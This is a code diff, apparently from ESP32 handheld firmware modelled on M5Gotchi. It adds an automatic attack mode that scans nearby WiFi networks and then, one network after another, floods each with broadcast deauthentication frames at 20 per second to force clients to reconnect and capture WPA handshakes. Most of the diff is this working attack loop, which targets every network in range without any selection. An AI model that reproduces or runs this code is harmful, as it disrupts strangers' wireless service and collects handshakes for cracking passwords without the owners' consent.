@@ -21,6 +21,7 @@ uint32_t OinkMode::lastScanTime = 0;
 std::vector<DetectedNetwork> OinkMode::networks;
 std::vector<CapturedHandshake> OinkMode::handshakes;
 int OinkMode::targetIndex = -1;
+int OinkMode::selectionIndex = 0;
 uint32_t OinkMode::packetCount = 0;
 uint32_t OinkMode::deauthCount = 0;
 
@@ -33,6 +34,24 @@ bool OinkMode::beaconCaptured = false;
 const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
 const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
 uint8_t currentHopIndex = 0;
+
+// Deauth timing
+static uint32_t lastDeauthTime = 0;
+static uint32_t lastMoodUpdate = 0;
+
+// Auto-attack state machine (like M5Gotchi)
+enum class AutoState {
+    SCANNING,       // Scanning for networks
+    ATTACKING,      // Deauthing + sniffing target
+    WAITING,        // Delay between attacks
+    NEXT_TARGET     // Move to next target
+};
+static AutoState autoState = AutoState::SCANNING;
+static uint32_t stateStartTime = 0;
+static uint32_t attackStartTime = 0;
+static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
+static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
+static const uint32_t WAIT_TIME = 2000;         // 2 sec between targets
 
 void OinkMode::init() {
     networks.clear();
@@ -55,25 +74,35 @@ void OinkMode::init() {
 void OinkMode::start() {
     if (running) return;
     
-    Serial.println("[OINK] Starting...");
+    Serial.println("[OINK] Starting auto-attack mode (like M5Gotchi)...");
     
     // Initialize WiFi in promiscuous mode
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
+    delay(100);  // Give WiFi time to settle
     
-    esp_wifi_set_promiscuous(true);
+    // Set callback BEFORE enabling promiscuous mode
     esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
+    esp_wifi_set_promiscuous_filter(nullptr);  // Receive all packet types
+    esp_wifi_set_promiscuous(true);
     
     // Set channel
     esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
     
     running = true;
     scanning = true;
+    channelHopping = true;
     lastHopTime = millis();
     lastScanTime = millis();
     
+    // Initialize auto-attack state machine
+    autoState = AutoState::SCANNING;
+    stateStartTime = millis();
+    selectionIndex = 0;
+    
+    Mood::setStatusMessage("Scanning for targets...");
     Display::setWiFiStatus(true);
-    Serial.println("[OINK] Running");
+    Serial.println("[OINK] Auto-attack running");
 }
 
 void OinkMode::stop() {
@@ -105,12 +134,103 @@ void OinkMode::update() {
     
     uint32_t now = millis();
     
-    // Channel hopping
-    if (channelHopping && !deauthing) {
-        if (now - lastHopTime > Config::wifi().channelHopInterval) {
-            hopChannel();
-            lastHopTime = now;
-        }
+    // Auto-attack state machine (like M5Gotchi)
+    switch (autoState) {
+        case AutoState::SCANNING:
+            // Channel hopping during scan
+            if (now - lastHopTime > Config::wifi().channelHopInterval) {
+                hopChannel();
+                lastHopTime = now;
+            }
+            
+            // Update mood
+            if (now - lastMoodUpdate > 3000) {
+                Mood::onSniffing(networks.size(), currentChannel);
+                lastMoodUpdate = now;
+            }
+            
+            // After scan time, pick first target
+            if (now - stateStartTime > SCAN_TIME && !networks.empty()) {
+                selectionIndex = 0;
+                autoState = AutoState::NEXT_TARGET;
+                Serial.println("[OINK] Scan complete, starting auto-attack");
+            }
+            break;
+            
+        case AutoState::NEXT_TARGET:
+            // Find next target that hasn't been attacked
+            if (selectionIndex >= (int)networks.size()) {
+                // All networks attacked, rescan
+                selectionIndex = 0;
+                autoState = AutoState::SCANNING;
+                stateStartTime = now;
+                channelHopping = true;
+                deauthing = false;
+                Mood::setStatusMessage("Rescanning...");
+                Serial.println("[OINK] All targets done, rescanning");
+                break;
+            }
+            
+            // Select this target
+            selectTarget(selectionIndex);
+            autoState = AutoState::ATTACKING;
+            attackStartTime = now;
+            deauthCount = 0;  // Reset for this target
+            Serial.printf("[OINK] Auto-attacking: %s\n", networks[selectionIndex].ssid);
+            break;
+            
+        case AutoState::ATTACKING:
+            // Send deauth packets
+            if (now - lastDeauthTime > 50) {  // 20 deauths per second
+                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
+                    DetectedNetwork* target = &networks[targetIndex];
+                    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    sendDeauthFrame(target->bssid, broadcast, 7);
+                    deauthCount++;
+                    lastDeauthTime = now;
+                }
+            }
+            
+            // Update mood with attack progress
+            if (now - lastMoodUpdate > 2000) {
+                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
+                    Mood::onDeauthing(networks[targetIndex].ssid, deauthCount);
+                }
+                lastMoodUpdate = now;
+            }
+            
+            // Check if handshake captured for this target
+            for (const auto& hs : handshakes) {
+                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
+                    if (memcmp(hs.bssid, networks[targetIndex].bssid, 6) == 0 && hs.isComplete()) {
+                        // Got handshake! Move to next
+                        Serial.printf("[OINK] Handshake captured for %s!\n", networks[targetIndex].ssid);
+                        selectionIndex++;
+                        autoState = AutoState::WAITING;
+                        stateStartTime = now;
+                        deauthing = false;
+                        break;
+                    }
+                }
+            }
+            
+            // Timeout - move to next target
+            if (now - attackStartTime > ATTACK_TIMEOUT) {
+                Serial.printf("[OINK] Timeout on %s, moving to next\n", 
+                    targetIndex >= 0 ? networks[targetIndex].ssid : "?");
+                selectionIndex++;
+                autoState = AutoState::WAITING;
+                stateStartTime = now;
+                deauthing = false;
+            }
+            break;
+            
+        case AutoState::WAITING:
+            // Brief pause between attacks
+            if (now - stateStartTime > WAIT_TIME) {
+                autoState = AutoState::NEXT_TARGET;
+            }
+            break;
     }
     
     // Periodic network cleanup - remove stale entries
@@ -147,7 +267,10 @@ void OinkMode::selectTarget(int index) {
         channelHopping = false;
         setChannel(networks[index].channel);
         
-        Serial.printf("[OINK] Target selected: %s\n", networks[index].ssid);
+        // Auto-start deauth when target selected
+        deauthing = true;
+        
+        Serial.printf("[OINK] Target selected: %s - Deauth auto-started\n", networks[index].ssid);
     }
 }
 
@@ -156,8 +279,9 @@ void OinkMode::clearTarget() {
         networks[targetIndex].isTarget = false;
     }
     targetIndex = -1;
+    deauthing = false;
     channelHopping = true;
-    Serial.println("[OINK] Target cleared");
+    Serial.println("[OINK] Target cleared, deauth stopped");
 }
 
 DetectedNetwork* OinkMode::getTarget() {
@@ -165,6 +289,25 @@ DetectedNetwork* OinkMode::getTarget() {
         return &networks[targetIndex];
     }
     return nullptr;
+}
+
+void OinkMode::moveSelectionUp() {
+    if (networks.empty()) return;
+    selectionIndex--;
+    if (selectionIndex < 0) selectionIndex = networks.size() - 1;
+}
+
+void OinkMode::moveSelectionDown() {
+    if (networks.empty()) return;
+    selectionIndex++;
+    if (selectionIndex >= (int)networks.size()) selectionIndex = 0;
+}
+
+void OinkMode::confirmSelection() {
+    if (networks.empty()) return;
+    if (selectionIndex >= 0 && selectionIndex < (int)networks.size()) {
+        selectTarget(selectionIndex);
+    }
 }
 
 void OinkMode::startDeauth() {
@@ -228,21 +371,7 @@ void IRAM_ATTR OinkMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_typ
         default:
             break;
     }
-    
-    // If deauthing, periodically send deauth frames
-    if (deauthing && targetIndex >= 0) {
-        static uint32_t lastDeauth = 0;
-        uint32_t now = millis();
-        
-        if (now - lastDeauth > 100) {  // 10 deauths per second
-            DetectedNetwork* target = &networks[targetIndex];
-            // Broadcast deauth
-            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-            sendDeauthFrame(target->bssid, broadcast, 7);  // Reason: Class 3 frame
-            deauthCount++;
-            lastDeauth = now;
-        }
-    }
+    // Deauth moved to update() for reliable timing
 }
 
 void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
